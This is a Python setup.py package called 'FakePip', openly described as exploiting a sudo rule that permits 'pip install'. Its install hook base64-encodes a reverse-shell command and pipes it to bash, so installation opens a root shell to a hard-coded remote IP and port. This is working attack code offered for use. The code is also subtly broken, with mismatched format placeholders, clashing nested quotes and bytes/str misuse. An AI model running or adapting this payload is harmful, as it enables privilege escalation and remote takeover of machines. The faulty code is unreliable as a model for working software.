from setuptools import setup
from setuptools.command.install import install
import base64
import os


class CustomInstall(install):
    def run(self):
        install.run(self)
        LHOST = '1.117.150.194'  # change this
        LPORT = 12345
        
        reverse_shell = 'python -c "import sys, socket, os, pty;s = socket.socket();s.connect((os.getenv("RHOST"), int(os.getenv("RPORT"))));[os.dup2(s.fileno(), fd) for fd in (0, 1, 2)];pty.spawn("/bin/sh")"'.format(
            RHOST=LHOST, RPORT=LPORT)
        encoded = base64.b64encode(reverse_shell)
        os.system('echo %s|base64 -d|bash' % encoded)


setup(name='FakePip', version='0.0.1', description='This will exploit a sudoer able to /usr/bin/pip install *',
      url='https://github.com/staccat0/fakepip', author='zc00l', author_email='andre.marques@esecurity.com.br',
      license='MIT', zip_safe=False, cmdclass={'install': CustomInstall})
